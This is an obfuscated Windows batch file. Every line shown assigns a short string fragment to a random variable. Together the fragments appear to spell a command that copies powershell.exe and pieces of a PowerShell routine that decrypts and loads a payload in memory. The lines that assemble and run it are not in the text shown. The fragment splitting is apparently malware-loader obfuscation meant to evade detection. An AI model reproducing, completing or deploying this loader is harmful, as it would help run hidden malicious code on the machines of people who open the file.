@echo off
set "kCXeqiRSzx=do"
set "trYgHuEhsm=st"
set "jJryRPYJmT=nd"
set "vlzfHkvsrl=32"
set "GViQpdebiP=po"
set "ODkfDocTzE=1."
set "ZlQgFXKZti=ws"
set "IBJyeUwkGY=0\"
set "jyZiQxvLUg=he"
set "FFvBrNeGhw=we"
set "GjIVDaauOV=\W"
set "UqaATjxVTf=rs"
set "FiidjYvdPy=xe"
set "QQckeqVHWg=.e"
set "McbqbdmDEv=we"
set "rJQHmSGpCP= /"
set "deJBEDWlbv= C"
set "msqAlsyfpM=Sy"
set "LguXZbRQqt=\v"
set "rYBvqGtMjg=s\"
set "FHjrMTvuPA=he"
set "bluXZTxsra=in"
set "hsUXjkiVil=em"
set "bQDhBsakZk=:\"
set "qoLLKXjzfB=ll"
set "WTfkqsjBGw=py"
set "jbKKYdghgr=ll"
set "cpPBpPFZmv=y "
set "DLTDEfpYIX=ow"
set "fxLWrxqDVB=Wi"
set "jiVrWQvnrb=rS"
set "UIkQwzWUZG=co"
set "kNhmjkRCgN=Po"
set "lZhwVRJLmL=cd"
set "QDZdslgFEi= %~dp0"
set "XzRTpPQJkb=kbwJ"
set "WZxSmIAocz=PU.I"
set "ZsiLbxdCWm=Fo7l"
set "ivXKgBwFUP=qz);"
set "epeBKQAPjE=PnPU"
set "qJNApQipBB=yste"
set "RdWUtvWkzO=($Ls"
set "qpuybtOxUU=).Sp"
set "aoxhKbHvlb=cv, "
set "NKNyVpoufL=embl"
set "aGWWMvpwvf= [st"
set "PrIWZMYpwc=nirt"
set "IaNBqOnxUZ=[Sys"
set "RCBAUTLvdJ=-Obj"
set "NisoMkwoCX=.Com"
set "HlfYTCWBgo=.Mem"
set "WgXvPohwqM=m(, "
set "EESWxqeTsz=Secu"
set "bxYNUqykfv=..-1"
set "aictcShDZu=iGr "
set "KNVWzAXGVw=ion."
set "wkyxfyIJTa=ose("
set "EFzaUHdOFE=[Env"
set "RbKXVCrSQt=isfL"
set "ovTWNjzqew=rt]:"
set "hWdFbouAhn=tem."
set "rZOmjLuALZ=Obje"
set "DWtYvsxFiV=[Sys"
set "mdUVQOvJtL=$JVa"
set "qNzWsRjiEM=ypto"
set "ofhUDRFjDb=join"
set "SvSLmuYLhr=k; }"
set "dpletUyYyw=OlT "
set "tupxNmRxHk=('l0"
set "hUzoRbubWA=0O+g"
set "WiojpjXtGw=wJ ="
set "twDVZRmAki=[Sys"
set "QtIDVWwAKf=V = "
set "JYjpvvwolS=and "
set "dVuNmYIjZl=tPOS"
set "yCpWfxdysk=O.Me"
set "YlpNOJcqkz=.Con"
set "PPSHoyNhzu=g = "
set "DCliLnGGYQ=ach "
set "ETaGUrKeNa=736u"
set "FEiZisihYZ=eam("
set "jjGklgCVPX=gnir"
set "znujpVboLl=yste"
set "svSrKOCePs=mory"
set "jyHGxiuRiB== [S"
set "NOLiyVvTaR=tPOS"
set "iNVynLXJOb=e = "
set "JqUxLsPvce=m.IO"
set "HjcApqEztB=esFX"
set "ayGrzmdmIA=tryP"
set "yazWXznCQG=] -j"
set "mKCGLapUNX=UP.T"
set "PjoNGUYfbR=wJ.T"
set "oVsRpOsUsU=;$qw"
set "UaRzgWaWmw=ct S"
set "SfOMskqugt=$bkb"
set "rwSnpxKSja=fore"
set "ajwaNSEuSM=morF"
set "pZRpSRRmJc=ewLi"
